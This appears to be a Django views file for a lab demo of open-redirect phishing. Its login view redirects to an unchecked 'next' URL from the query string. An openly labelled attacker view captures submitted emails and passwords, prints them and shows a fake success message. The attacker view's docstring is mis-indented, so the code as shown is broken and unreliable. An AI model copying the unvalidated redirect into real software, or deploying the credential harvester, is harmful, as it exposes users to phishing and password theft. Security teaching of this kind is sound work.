from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages


def login_view(request):
    """Handle user login"""
    if request.user.is_authenticated:
        return redirect('home')
    
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        user = authenticate(request, username=email, password=password)
        
        if user is not None:
            login(request, user)
            messages.success(request, 'You have successfully logged in!')
            next_url = request.GET.get('next', 'home')
            return redirect(next_url)
        else:
            messages.error(request, 'Invalid email or password.')
    
    return render(request, 'login.html')


def logout_view(request):
    """Handle user logout"""
    if request.method == 'POST':
        logout(request)
        messages.success(request, 'You have been logged out successfully.')
        return redirect('login')
    return redirect('home')

def attacker_view(request):
"""Attacker page"""
    context = {}
    
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        if email and password:
            print(f"[ATTACKER] Captured - Email: {email}, Password: {password}")
        
        context['captured_email'] = email
        context['captured_password'] = password
        messages.success(request, 'Successfully logged in!')

    return render(request, 'attacker.html', context)


@login_required
def home_view(request):
    """Home page - requires authentication"""
    return render(request, 'home.html')
